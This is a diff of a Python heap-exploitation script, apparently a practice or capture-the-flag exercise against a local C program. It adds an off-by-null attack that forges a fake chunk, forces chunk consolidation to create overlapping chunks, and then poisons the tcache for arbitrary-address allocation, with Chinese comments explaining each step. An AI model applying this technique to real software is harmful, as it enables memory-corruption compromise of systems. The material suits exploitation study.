@@ -117,14 +117,14 @@ def test_malloc_free():
 '''
 @show_message
 def off_by_null_attack():
-    print(hex(io.libc.address+0x1b8000)) #会修改目标地址会堆上的地址的值
-    targetaddr = p64(io.libc.address+0x1b8000-0x20)
+    # print(hex(io.libc.address+0x1b8000)) #会修改目标地址 堆上的地址的值
+    # targetaddr = p64(io.libc.address+0x1b8000-0x20)
     io.sendline("1")
     #0x38 0x28 0xf8
-    malloc_chunk("1","0x38")  # chunk size 0x430
-    malloc_chunk("2","0x28")  # chunk size 0x4a0
+    malloc_chunk("1","0x38")  # chunk size 
+    malloc_chunk("2","0x28")  # chunk size 
     
-    malloc_chunk("3","0xf8") # chunk size 0x4b0
+    malloc_chunk("3","0xf8") # chunk size 
     chunk1_address = leak_chunk_address("1")
     #fake_size = chunkA_size + chunkb_size + 0x10
     '''
@@ -136,6 +136,7 @@ def off_by_null_attack():
     fake_size = 0x38 + 0x28
     '''
     construct fake chunk1
+    构造一个伪造的chunk块，使得3号可以merge到这里来
     a[0] = 0
     a[1] = p64(fake_size)
     a[2] = p64(chunk1_address)
@@ -143,7 +144,7 @@ def off_by_null_attack():
     '''
     fake_chunk1 = p64(0) + p64(fake_size) + p64(chunk1_address) * 2
     edit_chunk("1",str(len(fake_chunk1)),fake_chunk1)
-    fake_chunkb = b'a' * 0x20+p64(fake_size) +b'\x00'
+    fake_chunkb = b'a' * 0x20 + p64(fake_size) + b'\x00'
     edit_chunk('2',str(len(fake_chunkb)),fake_chunkb)
     #gdb.attach(io)
     '''
@@ -158,10 +159,32 @@ def off_by_null_attack():
         free_chunk(str(i+4))
     #malloc_chunk("2","512")  # chunk size 0x420
     #malloc_chunk("8","512")
-
-    free_chunk("3")
+    
     #这里达到的效果应该是 将chunk 1 放入到了unsorted bin中
-    gdb.attach(io)
+    free_chunk("3")
+    #free chunk 3 后，会进行chunk块的consolidate(merge),此时 1 2 3 号块merge成一个chunk块 A
+    malloc_chunk("14","0x158")
+    malloc_chunk("16","0x28")
+    free_chunk("16")
+
+    free_chunk("2")
+    #free chunk 2 后，会将chunk2 B chunk放入到tcache 块的对应位置
+    #注意： A chunk 块，此时包含了 B chunk块
+    
+    
+    # 将 A chunk 块申请出来使用后，相对B chunk块，可以构成UAF,从而可以实现任意地址malloc
+
+    ###
+    # malloc_chunk("15","0x28")
+    fake_payload = p64(0x5617ebd652a0)*6 + p64(chunk1_address+0x70)#+p64(chunk1_address+0x60) + p64(0x60)*2 + p64(0) + p64(0)
+    edit_chunk("14",str(len(fake_payload)),fake_payload)
+    #tcache poisoning
+    malloc_chunk("20","0x28")
+    malloc_chunk("21","0x28")
+    gdb.attach(io,
+    '''b source/chunk_manage.c:18
+        c
+    ''')
     #malloc_chunk("3","0x448")
     #edit_chunk("1","0x38","A"*0x38+b"\0".decode('utf-8'))
     #free_chunk("2") # put the chunk 2 into unsorted bin
